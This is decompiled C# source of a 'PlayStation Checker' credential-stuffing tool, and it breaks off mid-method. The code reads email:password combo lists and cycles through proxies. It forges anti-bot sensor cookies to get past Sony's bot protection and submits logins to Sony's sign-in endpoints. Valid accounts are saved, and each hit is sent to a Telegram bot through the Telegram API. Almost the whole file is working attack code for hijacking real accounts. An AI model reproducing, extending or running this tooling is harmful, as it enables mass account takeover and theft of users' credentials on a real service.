using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Authentication;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Leaf.xNet;
using Newtonsoft.Json.Linq;
using OpenQA.Selenium;

namespace PlayStation_Checker_by_Halo
{
	// Token: 0x0200000A RID: 10
	public class Cracker
	{
		// Token: 0x1700001B RID: 27
		// (get) Token: 0x0600009C RID: 156 RVA: 0x000023ED File Offset: 0x000005ED
		// (set) Token: 0x0600009D RID: 157 RVA: 0x000023F5 File Offset: 0x000005F5
		public ConcurrentQueue<string> Accounts { get; set; }

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x0600009E RID: 158 RVA: 0x000023FE File Offset: 0x000005FE
		// (set) Token: 0x0600009F RID: 159 RVA: 0x00002406 File Offset: 0x00000606
		public List<string> Proxies { get; set; }

		// Token: 0x1700001D RID: 29
		// (get) Token: 0x060000A0 RID: 160 RVA: 0x0000240F File Offset: 0x0000060F
		// (set) Token: 0x060000A1 RID: 161 RVA: 0x00002417 File Offset: 0x00000617
		public List<Sensor> Sensors { get; set; }

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x060000A2 RID: 162 RVA: 0x00002420 File Offset: 0x00000620
		// (set) Token: 0x060000A3 RID: 163 RVA: 0x00002428 File Offset: 0x00000628
		public List<Sensor> SensorsTemp { get; set; }

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x060000A4 RID: 164 RVA: 0x00002431 File Offset: 0x00000631
		// (set) Token: 0x060000A5 RID: 165 RVA: 0x00002439 File Offset: 0x00000639
		public string BotInf { get; set; }

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x060000A6 RID: 166 RVA: 0x00002442 File Offset: 0x00000642
		// (set) Token: 0x060000A7 RID: 167 RVA: 0x0000244A File Offset: 0x0000064A
		public bool AutoSend { get; set; }

		// Token: 0x17000021 RID: 33
		// (get) Token: 0x060000A8 RID: 168 RVA: 0x00002453 File Offset: 0x00000653
		// (set) Token: 0x060000A9 RID: 169 RVA: 0x0000245A File Offset: 0x0000065A
		public static string AutoSavePath { get; private set; }

		// Token: 0x17000022 RID: 34
		// (get) Token: 0x060000AA RID: 170 RVA: 0x00002462 File Offset: 0x00000662
		// (set) Token: 0x060000AB RID: 171 RVA: 0x0000246A File Offset: 0x0000066A
		public string ProxyType { get; set; }

		// Token: 0x060000AC RID: 172 RVA: 0x000070F8 File Offset: 0x000052F8
		public Cracker()
		{
			this.activityView = ControlsLink.GetLink().ActivityView;
			this.settings = ControlsLink.GetLink().Settings;
			this.Accounts = new ConcurrentQueue<string>();
			this.Sensors = new List<Sensor>();
			this.SensorsTemp = new List<Sensor>();
			this.Proxies = new List<string>();
			this.Timer.Interval = 1000;
			this.Timer.Tick += this.Timer_Tick;
			this.Timer.Start();
			this._updatetimer.Tick += this.Updatetimer_Tick;
			this.processKillerTimer.Interval = 30000;
			this.processKillerTimer.Tick += this.ProcessKillerTimer_Tick;
		}

		// Token: 0x060000AD RID: 173 RVA: 0x00007264 File Offset: 0x00005464
		private void ProcessKillerTimer_Tick(object sender, EventArgs e)
		{
			if (this._Worker)
			{
				try
				{
					return;
				}
				catch (Exception)
				{
					throw;
				}
			}
			this.processKillerTimer.Stop();
		}

		// Token: 0x060000AE RID: 174 RVA: 0x0000729C File Offset: 0x0000549C
		private void Updatetimer_Tick(object sender, EventArgs e)
		{
			try
			{
				File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", string.Concat(new string[]
				{
					"Proxy meanet to be update at ",
					this._timer.Elapsed.Hours.ToString(),
					":",
					this._timer.Elapsed.Minutes.ToString(),
					":",
					this._timer.Elapsed.Seconds.ToString(),
					Environment.NewLine
				}));
			}
			catch (Exception)
			{
			}
			if (this._Worker)
			{
				string path = string.Empty;
				ControlsLink.GetLink().Settings.Invoke(new ThreadStart(delegate()
				{
					path = ControlsLink.GetLink().Settings.ProxyLink_tb.Text;
				}));
				new Thread(delegate()
				{
					this.LoadProxyFromUrl(path, false);
				}).Start();
			}
			else
			{
				try
				{
					File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Proxy timer closed" + Environment.NewLine);
				}
				catch (Exception)
				{
				}
				this._updatetimer.Stop();
			}
		}

		// Token: 0x060000AF RID: 175 RVA: 0x000073EC File Offset: 0x000055EC
		private void Timer_Tick(object sender, EventArgs e)
		{
			Application.DoEvents();
			if (this._Worker)
			{
				this.UpdateLabel(ControlsLink.GetLink().GloalTimerLabel, string.Format("{0:00} : {1:00} : {2:00}", this._timer.Elapsed.Hours, this._timer.Elapsed.Minutes, this._timer.Elapsed.Seconds));
				this.UpdateUI();
			}
			Application.DoEvents();
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x00007474 File Offset: 0x00005674
		private void CreateNewResultFolder()
		{
			Cracker.AutoSavePath = string.Concat(new string[]
			{
				Application.StartupPath,
				"\\Results\\",
				DateTime.Today.Day.ToString().Replace('/', ' '),
				"-",
				DateTime.Now.Hour.ToString(),
				"'",
				DateTime.Now.Minute.ToString(),
				"''"
			});
			string path = Application.StartupPath + "\\Results";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (!Directory.Exists(Cracker.AutoSavePath))
			{
				Directory.CreateDirectory(Cracker.AutoSavePath);
			}
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x00007548 File Offset: 0x00005748
		public void LoadProxyFromUrl(string url, bool showmessage)
		{
			try
			{
				List<string> list = new List<string>();
				string input = new WebClient().DownloadString(url);
				Regex regex = new Regex("(\\S{1,100}:\\S{1,100})");
				foreach (object obj in regex.Matches(input))
				{
					Match match = (Match)obj;
					try
					{
						string value = match.Groups[1].Value;
						using (new HttpRequest
						{
							Proxy = ProxyClient.Parse(Leaf.xNet.ProxyType.HTTP, value)
						})
						{
						}
						list.Add(value);
					}
					catch
					{
					}
				}
				if (list.Count > 0)
				{
					this.Proxies.Clear();
					this.Proxies = list;
				}
				this.LoadedPx = this.Proxies.Count;
				ControlsLink.GetLink().Leecher.LoadedProxy = this.Proxies.Count;
				this.UpdateUI();
				try
				{
					File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Proxies loded: " + this.LoadedPx.ToString() + Environment.NewLine);
				}
				catch (Exception)
				{
				}
				if (showmessage)
				{
					MessageBox.Show(this.LoadedPx.ToString() + " Proxies loaded succesfully!", "Operation succesful", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
			}
			catch (Exception ex)
			{
				try
				{
					File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Error loadin proxy!ex->" + ex.Message + Environment.NewLine);
				}
				catch (Exception)
				{
				}
				this._PError++;
				this.UpdateUI();
				if (showmessage)
				{
					MessageBox.Show("Error Loading proxies!The url must be incorrect or the api is busy!", "Error loading proxy", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x0000778C File Offset: 0x0000598C
		public void UpdateUI()
		{
			try
			{
				Application.DoEvents();
				int num = this._Hit + this._Bads + this._Guard + this._TwoStep;
				this.UpdateLabel(this.activityView.LoadedCombo_lbl, this.LoadedCb.ToString());
				this.UpdateLabel(this.activityView.LoadedProxies_lbl, this.LoadedPx.ToString());
				this.UpdateLabel(this.settings.LoadedPx_lbl, this.LoadedPx.ToString());
				this.UpdateLabel(this.activityView.Hits_lbl, this._Hit.ToString());
				this.UpdateLabel(this.activityView.Bad_lbl, this._Bads.ToString());
				this.UpdateLabel(this.activityView.Guard_lbl, this._Guard.ToString());
				this.UpdateLabel(this.activityView.AllChecked_lbl, (this._Hit + this._Bads + this._Guard + this._TwoStep).ToString());
				this.UpdateLabel(this.activityView.CAPErrors_lbl, this._CapError.ToString());
				this.UpdateLabel(this.activityView.PErrors_lbl, this._PError.ToString());
				this.UpdateLabel(this.activityView.WithDeactive_lbl, this._deactiveable.ToString());
				this.UpdateLabel(this.activityView.WithoutDeactive_lbl, this._undeactivable.ToString());
				if (this._Worker)
				{
					string text = ((this._CselectedInd == 2) ? (this.LoadedPx - num) : (this.LoadedCb - num)).ToString();
					this.UpdateLabel(this.activityView.Remaining_lbl, text);
				}
				this.UpdateLabel(this.activityView.TwoStep_lbl, this._TwoStep.ToString());
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060000B3 RID: 179 RVA: 0x00002473 File Offset: 0x00000673
		public void UpdateLabel(Label label, string text)
		{
			label.Text = text;
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x00007984 File Offset: 0x00005B84
		public void Stop(int tries)
		{
			this._Worker = false;
			for (int i = 0; i < tries; i++)
			{
				try
				{
					this._Worker = false;
					this.UpdateLabel(this.activityView.Remaining_lbl, "0");
					this.UpdateLabel(this.activityView.AllChecked_lbl, "Done");
					this.UpdateUI();
					List<string> list = new string[]
					{
						"chrome",
						"chromedriver"
					}.ToList<string>();
					foreach (string processName in list)
					{
						Process[] processesByName = Process.GetProcessesByName(processName);
						foreach (Process process in processesByName)
						{
							try
							{
								process.Kill();
							}
							catch (Exception)
							{
							}
						}
					}
					ControlsLink.GetLink().Settings.SaveUnchecked_btn_Click(this, null);
				}
				catch (Exception)
				{
					Thread.Sleep(250);
					try
					{
						File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Retry to stop..." + Environment.NewLine);
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x00007ADC File Offset: 0x00005CDC
		[Obfuscation(Feature = "virtualization", Exclude = false)]
		public void Start(int ModeCode)
		{
			if (!this.actived)
			{
				MessageBox.Show("Aouthentication error!", "Error Code Q-0", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				this._CselectedInd = ModeCode;
				try
				{
					if (this._Worker)
					{
						MessageBox.Show("Please Stop Proccesor First!", "Cracker is running", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					else
					{
						this._updatetime = Convert.ToInt32(this.settings.update_nu.Value) * 1000;
						this.ProxyType = ControlsLink.GetLink().Settings.ProxyType_cob.SelectedItem.ToString();
						int cselectedInd = this._CselectedInd;
						int num = cselectedInd;
						if (num != 2)
						{
							if (num != 3)
							{
								if (num - 9 > 1)
								{
									if (this.Proxies.Count == 0 || this.Accounts.Count == 0)
									{
										MessageBox.Show("Please Insert All Requered Fields such ProxyList,ComboList .etc", "Not all fields inserted", MessageBoxButtons.OK, MessageBoxIcon.Hand);
										return;
									}
									string input = new WebClient().DownloadString("https://id.sonyentertainmentnetwork.com/signin/?client_id=fe1fdbfa-f1a1-47ac-b793-e648fba25e86&redirect_uri=https://secure.eu.playstation.com/psnauth/PSNOAUTHResponse/pdc/&service_entity=urn:service-entity:psn&response_type=code&scope=psn:s2s&ui=pr&service_logo=ps&request_locale=en_GB&error=login_required&error_code=4165&error_description=User+is+not+authenticated#/signin?entry=%2Fsignin");
									this.sensorPath = "public/" + Regex.Match(input, "public/(.*?)'").Groups[1].Value;
									this.sensorPath = this.sensorPath.Insert(0, "https://id.sonyentertainmentnetwork.com/");
									this._Worker = true;
									this._TimeOut = 10000;
									this._Checked = this.Accounts.Count;
									this._timer.Restart();
									this._timer.Start();
								}
								else
								{
									if (this.Proxies.Count <= 0)
									{
										MessageBox.Show("Please Load Proxies first!", "Proxy List is empty!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
										return;
									}
									this._Worker = true;
									this._TimeOut = 10000;
								}
							}
							else
							{
								if (this.Accounts.Count <= 1)
								{
									MessageBox.Show("Please load accounts first!", "Account list is empty", MessageBoxButtons.OK, MessageBoxIcon.Hand);
									return;
								}
								this._TimeOut = 10000;
								this._Checked = this.Accounts.Count;
								this._timer.Restart();
								this._timer.Start();
								this._Worker = true;
							}
						}
						else
						{
							if (this.Proxies.Count <= 0)
							{
								MessageBox.Show("Please Load Proxies first!", "Proxy List is empty!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
								return;
							}
							this._Worker = true;
							this._TimeOut = 6000;
							this._timer.Restart();
							this._timer.Start();
						}
						if (this._Worker)
						{
							this._TwoStep = 0;
							this._Guard = 0;
							this._CapError = 0;
							this._PError = 0;
							this._Bads = 0;
							this._Hit = 0;
							this._BOT_ID = this.BotInf;
							ControlsLink.GetLink().ActivityView.Accounts_rtb.Text = "";
							ControlsLink.GetLink().ActivityView.HDeactive_rtb.Text = "";
							ControlsLink.GetLink().ActivityView.SiteChecker_rtb.Text = "";
							this.CreateNewResultFolder();
							this.settings.Thread_num.Value = ((this._CselectedInd == 3) ? 1m : this.settings.Thread_num.Value);
							int num2 = 0;
							while (num2 < this.settings.Thread_num.Value)
							{
								Thread thread = new Thread(new ThreadStart(new MethodInvoker(this, ldftn(Starter)).Invoke));
								thread.SetApartmentState(ApartmentState.MTA);
								thread.IsBackground = true;
								thread.Start();
								num2++;
							}
							this.AutoSend = this.settings.AoutoUpdateProxy_cb.Checked;
							if (this.settings.AoutoUpdateProxy_cb.Checked)
							{
								this._updatetimer.Interval = this._updatetime;
								this._updatetimer.Start();
							}
							this._timer.Restart();
							this._timer.Start();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show("Ecxeption caghed while starting!\r\n" + ex.ToString() + "\r\n", "Error-Code: Q1", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
		}

		// Token: 0x060000B6 RID: 182 RVA: 0x00007F1C File Offset: 0x0000611C
		private void Starter()
		{
			if (this._Worker)
			{
				try
				{
					new Thread(delegate()
					{
						for (;;)
						{
							Application.DoEvents();
							Application.DoEvents();
						}
					}).Start();
					switch (this._CselectedInd)
					{
					case 0:
						this._Capthure = true;
						if (this.CheckToContinue_Proxies() && this.CheckToContinue_Accounts())
						{
							this.AccountCheckAntiSensorAsync();
						}
						break;
					case 1:
						if (this.CheckToContinue_Proxies() && this.CheckToContinue_Accounts())
						{
							this.RegCheck();
						}
						break;
					case 2:
						if (this.CheckToContinue_Proxies())
						{
							this.ProxyCheck();
						}
						break;
					case 3:
						foreach (string text in this.Accounts)
						{
							Application.DoEvents();
							this.CheckPassword(text.Split(new char[]
							{
								':'
							})[0], text.Split(new char[]
							{
								':'
							})[1]);
							Application.DoEvents();
						}
						this._timer.Stop();
						this._Worker = false;
						break;
					case 4:
						if (this.CheckToContinue_Proxies() && !this.CheckToContinue_Accounts())
						{
						}
						break;
					case 5:
						if (this.CheckToContinue_Proxies() && !this.CheckToContinue_Accounts())
						{
						}
						break;
					case 9:
						if (!this.CheckToContinue_Proxies())
						{
						}
						break;
					case 10:
						if (this.CheckToContinue_Proxies())
						{
							this.SensorLeechSEL();
						}
						break;
					}
				}
				catch (Exception ex)
				{
					try
					{
						File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Error in starter method! ex->" + ex.ToString() + Environment.NewLine);
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x060000B7 RID: 183 RVA: 0x00008140 File Offset: 0x00006340
		private void CheckPassword(string user, string pass)
		{
			try
			{
				if (pass.Length > 7 && pass.Length < 31)
				{
					bool flag = pass.Any(new Func<char, bool>(char.IsDigit));
					bool flag2 = pass.Any(new Func<char, bool>(char.IsLetter));
					bool flag3 = pass.Any(new Func<char, bool>(char.IsUpper));
					bool flag4 = pass.Contains(user.Split(new char[]
					{
						'@'
					})[0]);
					if (flag3 && flag2 && flag && !flag4 && !this.CheckForReapit(pass))
					{
						if (!pass.Contains(user))
						{
							using (StreamWriter streamWriter = new StreamWriter(Cracker.AutoSavePath + "\\CheckedPassword.txt", true))
							{
								streamWriter.Write(user + ":" + pass + Environment.NewLine);
							}
							this._Hit++;
							this.UpdateUI();
						}
						else
						{
							this._Bads++;
							this.UpdateUI();
						}
					}
					else
					{
						this._Bads++;
						this.UpdateUI();
					}
				}
				else
				{
					this._Bads++;
					this.UpdateUI();
				}
				this._Checked--;
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060000B8 RID: 184 RVA: 0x000082D8 File Offset: 0x000064D8
		private bool CheckForReapit(string pass)
		{
			char c = '\0';
			int num = 0;
			char[] array = pass.ToCharArray();
			foreach (char c2 in array)
			{
				if (c == c2)
				{
					num++;
				}
				else
				{
					c = c2;
				}
			}
			return num > 0;
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x00008330 File Offset: 0x00006530
		private bool CheckToContinue_Accounts()
		{
			if (this._Checked < 50)
			{
				this.Timer.Stop();
				try
				{
					File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Cracker meanet to be stop Code R" + Environment.NewLine);
				}
				catch (Exception)
				{
				}
				this.Stop(1);
			}
			bool result;
			if (this._Checked == 0)
			{
				try
				{
					File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Cracker meanet to be stop Code R" + Environment.NewLine);
				}
				catch (Exception)
				{
				}
				this.Stop(3);
				result = false;
			}
			else
			{
				result = true;
			}
			return result;
		}

		// Token: 0x060000BA RID: 186 RVA: 0x000083E4 File Offset: 0x000065E4
		private bool CheckToContinue_Proxies()
		{
			bool result;
			if (this.Proxies.Count < 50 && this.settings.AoutoUpdateProxy_cb.Checked)
			{
				if (!this.loading)
				{
					this.loading = true;
					this.LoadProxyFromUrl(this.settings.ProxyLink_tb.Text, false);
					this.loading = false;
				}
				result = true;
			}
			else if (this.Proxies.Count < 5 && !this.settings.AoutoUpdateProxy_cb.Checked)
			{
				try
				{
					File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Cracker meanet to be stop  Code T" + Environment.NewLine);
				}
				catch (Exception)
				{
				}
				this.Stop(3);
				result = false;
			}
			else
			{
				result = true;
			}
			return result;
		}

		// Token: 0x060000BB RID: 187 RVA: 0x000084B0 File Offset: 0x000066B0
		private bool CheckToContinue_Sensors()
		{
			bool result;
			if (this.Sensors.Count < 1)
			{
				this.Stop(3);
				result = false;
			}
			else
			{
				result = true;
			}
			return result;
		}

		// Token: 0x060000BC RID: 188 RVA: 0x000084DC File Offset: 0x000066DC
		private string GetRandomProxy()
		{
			string result;
			try
			{
				int index;
				for (;;)
				{
					if (this.Proxies.Count <= 10)
					{
						if (this.settings.AoutoUpdateProxy_cb.Checked)
						{
							break;
						}
					}
					if (this.Proxies.Count <= 10)
					{
						goto IL_CC;
					}
					Random random = new Random();
					index = random.Next(0, this.Proxies.Count - 1);
					if (!string.IsNullOrEmpty(this.Proxies[index]))
					{
						goto IL_BC;
					}
					this.Proxies.RemoveAt(index);
				}
				if (!this.loading)
				{
					this.loading = true;
					this.LoadProxyFromUrl(this.settings.ProxyLink_tb.Text, false);
					this.loading = false;
				}
				return this.GetRandomProxy();
				IL_BC:
				return this.Proxies[index];
				IL_CC:
				try
				{
					File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Cracker meanet to be stop  Code U" + Environment.NewLine);
				}
				catch (Exception)
				{
				}
				this.Stop(3);
				result = "0:0";
			}
			catch (Exception ex)
			{
				try
				{
					File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Error making random proxy! ex->" + ex.Message + Environment.NewLine);
				}
				catch (Exception)
				{
				}
				result = "0:0";
			}
			return result;
		}

		// Token: 0x060000BD RID: 189 RVA: 0x00008678 File Offset: 0x00006878
		private void ProxyCheck()
		{
			while (this._Worker)
			{
				if (this._Worker && this.CheckToContinue_Proxies())
				{
					try
					{
						string randomProxy = this.GetRandomProxy();
						this.Proxies.Remove(randomProxy);
						try
						{
							using (HttpRequest httpRequest = new HttpRequest())
							{
								httpRequest.IgnoreProtocolErrors = false;
								this.SetProxyType(randomProxy, httpRequest);
								httpRequest.Get("https://auth.api.sonyentertainmentnetwork.com/login.jsp?service_entity=psn&request_theme=liquid", null);
							}
							this._Hit++;
							Saver.SaveThis(randomProxy, SavePath.GoodProxies, null, "");
							this.UpdateUI();
						}
						catch (HttpException)
						{
							this._Bads++;
							this.UpdateUI();
						}
					}
					catch (Exception)
					{
						Thread.Sleep(100);
						this.ProxyCheck();
						break;
					}
				}
			}
		}

		// Token: 0x060000BE RID: 190 RVA: 0x00008764 File Offset: 0x00006964
		private string GetProxyScheme(string proxy)
		{
			string text = proxy;
			if (this.ProxyType == "Socks5")
			{
				text.Insert(0, "socks5://");
			}
			else if (this.ProxyType == "Socks4")
			{
				text.Insert(0, "socks4://");
			}
			else if (this.ProxyType == "Socks4a")
			{
				text.Insert(0, "socks4a://");
			}
			else if (this.ProxyType.Contains("Http"))
			{
				text = proxy;
			}
			return text;
		}

		// Token: 0x060000BF RID: 191 RVA: 0x000087F0 File Offset: 0x000069F0
		private void SetProxyType(string proxy, HttpRequest rq)
		{
			try
			{
				if (this.ProxyType == "Socks5")
				{
					rq.Proxy = ProxyClient.Parse(Leaf.xNet.ProxyType.Socks5, proxy);
				}
				else if (this.ProxyType == "Socks4")
				{
					rq.Proxy = ProxyClient.Parse(Leaf.xNet.ProxyType.Socks4, proxy);
				}
				else if (this.ProxyType == "Socks4a")
				{
					rq.Proxy = ProxyClient.Parse(Leaf.xNet.ProxyType.Socks4A, proxy);
				}
				else if (this.ProxyType.Contains("Http"))
				{
					rq.Proxy = ProxyClient.Parse(Leaf.xNet.ProxyType.HTTP, proxy);
				}
				else
				{
					rq.Proxy = ProxyClient.Parse(Leaf.xNet.ProxyType.HTTP, proxy);
				}
			}
			catch (Exception ex)
			{
				try
				{
					File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Error setting proxy type! ex->" + ex.ToString() + Environment.NewLine);
				}
				catch (Exception)
				{
				}
				throw new Exception("Error Set proxy!");
			}
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x000088EC File Offset: 0x00006AEC
		private string GetAnotherToCheck()
		{
			int num = 0;
			string result;
			try
			{
				string text;
				do
				{
					text = null;
					if (this._Checked > 0 && this._Hit + this._Bads + this._Guard + this._TwoStep <= this.LoadedCb)
					{
						this.Accounts.TryDequeue(out text);
					}
					else
					{
						try
						{
							File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Cracker meanet to be stop  Code V" + Environment.NewLine);
							goto IL_8F;
						}
						catch (Exception)
						{
							goto IL_8F;
						}
						goto IL_6F;
						IL_8F:
						this.Stop(3);
					}
					IL_6F:
					if (text != null)
					{
						break;
					}
					Thread.Sleep(1000);
				}
				while (num++ < 10);
				result = text;
			}
			catch (Exception ex)
			{
				try
				{
					File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Error getting acount for check! ex->" + ex.Message + Environment.NewLine);
				}
				catch (Exception)
				{
				}
				result = "a@x.x:a";
			}
			return result;
		}

		// Token: 0x060000C1 RID: 193 RVA: 0x000089FC File Offset: 0x00006BFC
		private void SentHitToTelegram(string text)
		{
			if (ControlsLink.GetLink().Settings.AoutoSendHits_cb.Checked)
			{
				try
				{
					string text2 = text.Replace(Environment.NewLine, "\n");
					string address = string.Concat(new string[]
					{
						"https://api.telegram.org/bot",
						this._BOT_ID.Split(new char[]
						{
							';'
						})[0],
						"/sendMessage?chat_id=",
						this._BOT_ID.Split(new char[]
						{
							'>'
						})[1],
						"&text=",
						text2
					});
					WebClient webClient = new WebClient();
					webClient.DownloadString(address);
				}
				catch (Exception ex)
				{
					try
					{
						File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Error Sending hit to telegram! ex->" + ex.Message + Environment.NewLine);
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x060000C2 RID: 194 RVA: 0x00008AF4 File Offset: 0x00006CF4
		private void AccountCheckAntiSensor()
		{
			while (this._Worker)
			{
				if (this._Worker && this.CheckToContinue_Proxies() && this.CheckToContinue_Accounts())
				{
					string randomProxy = this.GetRandomProxy();
					try
					{
						if (string.IsNullOrEmpty(randomProxy))
						{
							this._PError++;
							this.UpdateUI();
						}
						else
						{
							if (randomProxy.Contains("0:0"))
							{
								try
								{
									File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Cracker meanet to be stop  Code S" + Environment.NewLine);
								}
								catch (Exception)
								{
								}
								this.Stop(3);
								break;
							}
							if (this._Checked > 0)
							{
								string text = null;
								Sensor randomFromList = Sensor.GetRandomFromList(this.Sensors);
								if (randomFromList == null)
								{
									Thread.Sleep(100);
								}
								else
								{
									if (randomFromList.GetSensorString(true) == "STOP")
									{
										this.Stop(3);
										break;
									}
									int num = 0;
									try
									{
										using (HttpRequest httpRequest = new HttpRequest())
										{
											HttpResponse httpResponse = null;
											httpRequest.SslProtocols = (SslProtocols.Tls | SslProtocols.Tls11 | SslProtocols.Tls12);
											httpRequest.IgnoreProtocolErrors = true;
											httpRequest.Cookies = new CookieStorage(false, null);
											this.SetProxyType(randomProxy, httpRequest);
											httpRequest.Cookies.Add(new System.Net.Cookie("_abck", "0~-1~" + Uri.UnescapeDataString(randomFromList.GetSensorString(true)) + "~-1~-1~-1", "/", ".sonyentertainmentnetwork.com"));
											for (;;)
											{
												num++;
												text = this.GetAnotherToCheck();
												string text2 = string.Empty;
												httpRequest.KeepAlive = true;
												httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36";
												httpRequest.AddHeader("Host", "id.sonyentertainmentnetwork.com");
												httpRequest.AddHeader(HttpHeader.CacheControl, "max-age=0");
												httpRequest.AddHeader(HttpHeader.UpgradeInsecureRequests, "1");
												httpRequest.AddHeader("Sec-Fetch-User", "?1");
												httpRequest.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");
												httpRequest.AddHeader("Sec-Fetch-Site", "none");
												httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
												httpRequest.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.9,en-US;q=0.8,en;q=0.7");
												httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
												httpResponse = httpRequest.Post(this.sensorPath, " ", "text/plain;charset=UTF-8");
												if (httpResponse.StatusCode != Leaf.xNet.HttpStatusCode.Forbidden)
												{
													CookieStorage cookieStorage = new CookieStorage(false, null);
													for (int i = 0; i < httpRequest.Cookies.Count; i++)
													{
														if (httpRequest.Cookies.GetCookies("https://id.sonyentertainmentnetwork.com/")[i].Value != "")
														{
															cookieStorage.Add(httpRequest.Cookies.GetCookies("https://id.sonyentertainmentnetwork.com/")[i]);
														}
													}
													httpRequest.Cookies = cookieStorage;
													httpResponse = Actions.DoLogin(httpRequest, text.Split(new char[]
													{
														':'
													})[0], text.Split(new char[]
													{
														':'
													})[1]);
													text2 = httpResponse.ToString();
												}
												if (httpResponse.StatusCode == Leaf.xNet.HttpStatusCode.Forbidden)
												{
													this._CapError++;
													this.UpdateUI();
													this.Proxies.Remove(randomProxy);
													this.Accounts.Enqueue(text);
												}
												else if (!text2.Contains("Incorrect") && !text2.Contains("Invalid login"))
												{
													if (!text2.Contains("To sign in, an update of your account information is required") && !text2.Contains("Password expired"))
													{
														if (text2.Contains("Login successful") || text2.Contains("npsso"))
														{
															this._Hit++;
															this._Checked--;
															this.UpdateUI();
															Saver.SaveThis(string.Concat(new string[]
															{
																text.Split(new char[]
																{
																	':'
																})[0],
																":",
																text.Split(new char[]
																{
																	':'
																})[1],
																" | Proxy: ",
																randomProxy,
																" | Time: ",
																DateTime.Now.ToString()
															}), SavePath.Good, this.activityView.Accounts_rtb, "");
															this.SentHitToTelegram(string.Concat(new string[]
															{
																text.Split(new char[]
																{
																	':'
																})[0],
																":",
																text.Split(new char[]
																{
																	':'
																})[1],
																" | Proxy: ",
																randomProxy,
																" | Time: ",
																DateTime.Now.ToString()
															}));
															if (this._Capthure)
															{
																CookieStorage cookieStorage2 = new CookieStorage(false, null);
																foreach (object obj in httpResponse.Cookies.GetCookies("https://auth.api.sonyentertainmentnetwork.com/login.jsp"))
																{
																	System.Net.Cookie cookie = (System.Net.Cookie)obj;
																	cookieStorage2.Add(cookie);
																}
																this.CaptureAccount(text, randomProxy, cookieStorage2);
															}
														}
													}
													else
													{
														this._Guard++;
														this._Checked--;
														this.UpdateUI();
														Saver.SaveThis(string.Concat(new string[]
														{
															text.Split(new char[]
															{
																':'
															})[0],
															":",
															text.Split(new char[]
															{
																':'
															})[1],
															" | Proxy: ",
															randomProxy,
															" | Time: ",
															DateTime.Now.ToString()
														}), SavePath.Guard, null, "");
													}
												}
												else
												{
													this._Bads++;
													this._Checked--;
													this.UpdateUI();
													Saver.SaveThis(text.Split(new char[]
													{
														':'
													})[0] + ":" + text.Split(new char[]
													{
														':'
													})[1], SavePath.Bad, null, "");
												}
												if (httpResponse.StatusCode == Leaf.xNet.HttpStatusCode.Forbidden || !this.CheckToContinue_Accounts() || num >= 3 || !this._Worker)
												{
													break;
												}
												if (num != 1)
												{
													Sensor sensor = randomFromList;
													int totalUses = sensor.TotalUses;
													sensor.TotalUses = totalUses + 1;
												}
											}
										}
									}
									catch (HttpException ex)
									{
										if (ex.HttpStatusCode == Leaf.xNet.HttpStatusCode.Forbidden)
										{
											this._CapError++;
											this.UpdateUI();
											this.Proxies.Remove(randomProxy);
											this.Accounts.Enqueue(text);
										}
										else if (ex.HttpStatusCode == Leaf.xNet.HttpStatusCode.BadRequest)
										{
											this._Bads++;
											this._Checked--;
											this.UpdateUI();
											Saver.SaveThis(text.Split(new char[]
											{
												':'
											})[0] + ":" + text.Split(new char[]
											{
												':'
											})[1], SavePath.Bad, null, "");
										}
										else
										{
											this._PError++;
											this.UpdateUI();
											this.Proxies.Remove(randomProxy);
											this.Accounts.Enqueue(text);
